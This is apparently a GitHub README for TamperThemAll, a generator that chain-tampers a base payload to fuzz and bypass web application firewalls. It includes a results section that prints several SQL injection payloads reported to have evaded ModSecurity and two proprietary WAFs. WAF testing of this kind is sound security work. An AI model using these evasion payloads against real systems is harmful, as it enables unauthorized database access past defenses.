# TamperThemAll
A tampered payload generator to Fuzz Web Application Firewalls for Testing and Bypassing.

### [*] Know 'How and Why'
This tool aims to facilitate testers in the evaluation process of the goodness of a WAF (for development or bypassing purposes).
TTA takes in input a string representing your payload, it doesn't matter what kind of vulnerability it exploits (SQLi, XSS, CMD Injection etc.), and gives back a payloads set with the input string chain-tampered in all the possible combinations and permutations created by mixing and chaining all the available tampering scripts in WhatWAF in order to maximize the possibility of a Bypass based on these techniques.
An associations file is also created as tampering session tracker, it is used to find out what chain produced a certain payload, useful function for the post exploitation phase in which you have a set of bypassing payloads and no idea of where they come from (-search option in the tool).
Detailed Concept explained in the Medium article:
https://medium.com/@thesauruss/a-payload-tamperer-for-waf-bypassing-tamperthemall-tta-ef35d43a608c

### [*] CMD Options
```
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Base payload between single or double quotes (depends
                        on which kind of quotes the payload contains)
  -l CHAINLEN, --chainLen CHAINLEN
                        max number of tampering methods chained in a single tampering chain.
  -c CHAIN, --chain CHAIN
                        comma separated tampering chain, order matters (left
                        to right)
  -f TAMPERSLIST, --tampersList TAMPERSLIST
                        define your own tamper list to reduce the N
  -o OUTFILE, --outFile OUTFILE
                        output payloads list name
  -s SEARCH, --search SEARCH
                        search in a .association file what chain produced a
                        certain payload, also print(the 'payload evolution'
                        for further investigation. ex. -s
                        bypassingPayloadsFile,file.associations
  -a, --allTampers      print(available tamper scripts list
```
### [*] Usage Examples
##### Creating a Tampered payloads list
![unsageNormal](https://user-images.githubusercontent.com/25546186/67636036-964a9d80-f8cc-11e9-80f9-364f619d862e.png)

##### Creating a Tampered payloads list with a restricted tampers list
![reducedTampers](https://user-images.githubusercontent.com/25546186/67636071-df9aed00-f8cc-11e9-88ff-6ded85249d22.png)

##### Single tamperChain using
![chooseMode](https://user-images.githubusercontent.com/25546186/67636086-0eb15e80-f8cd-11e9-8f99-dd1249aeee02.png)

##### Search mode of what chains produced the bypassing payloads
This mode is used when you have bypassed the WAF using the produced payloadList and want to find out which chains produced the bypassing payloads. Useful to produce a better PoC or for reasearch purposes about the WAF Normalization Function.
![searchMode](https://user-images.githubusercontent.com/25546186/67636050-b8442000-f8cc-11e9-98d6-e451acd4dc06.png)

### [*] Achievements
When I started coding it I didn’t expect a single bypass, but at the end of the research I managed to bypass 3/3 of the given WAFs (Modsecurity and two proprietary solutions) in many different ways (XSS, SQLi and Command Injections).
The tests were in Whitebox and the plaintext payload was initially blocked by the WAFs.
Examples of crafted SQLi bypassing payloads:
Default SQLi Module
```
\u62acroot\uaab3'+%7C%7C+1=1;+--+-
root'++++++++%7C%7C++++++++1=1;++++++++--++++++++-
```
Strict SQLi Module of a proprietary WAF
```
roo/**/t\\'%0Cor%091=1;%0A--%0C-
/*!00000root'+%7C%7C+1=1;+--+-*/
root'%0Cor%091=1;%09--%0D-
/*!00000root'+or+1=1;+--+-*/
```
At the end of the testing phase the vulnerability with more bypasses found was the SQLi with 32 bypasses for the basic module (23 on a solution and 9 on another) and 3 bypasses for the strict SQLi protection module (on the same WAF).

### [*] Call for Contributors
Everyone interested in the development of this tool and technique, please contact me on twitter or linkedin.

**TODO LIST**:

**-** Add new Tampering Scripts. To add them you simply have to create a file containing the function (named as the file) and add it in the tampers folder. You also have to add the following line in the __init__.py under tampers/ dir:
```from tampers.yourTamperFileName import *```

**-** Add an option to specify which kind of vulnerability you want to exploit with the basePayload in order to create separate tampers lists for each vulnerability (this will reduce the number of payloads and requests sent to the WAF, the less you send the less you annoy)

**-**  Add a payload analysis phase to reduce the tampering script pool. Example: a payload that does not contain spaces should not be tampered with space_to_tab or other scripts related to that char.

**-**  Add a feature to load a list of base payloads from file in order to create a single payloads list for multiple base payloads, resulting bypasses can be separated in the search option by adding the referred base payload in the .associations file for each crafted payload. This should make it easier to test many base payloads at a time, instead of crafting a payloads list for each plain payload.

## A special thanks to WhatWaf
It is a tool by EkultekThe used to detect a firewall on a web application, and attempting to detect a bypass.
The Available tampering scripts used in this tool are taken from his tool.
Check it out here: https://github.com/Ekultek/WhatWaf
### [*] Author
Lacerenza Francesco - Systems and Networks Security Student.
twitter: [@lacerenza_fra](https://twitter.com/lacerenza_fra)
linkedin: [lacerenzafrancesco](https://www.linkedin.com/in/francesco-lacerenza/)
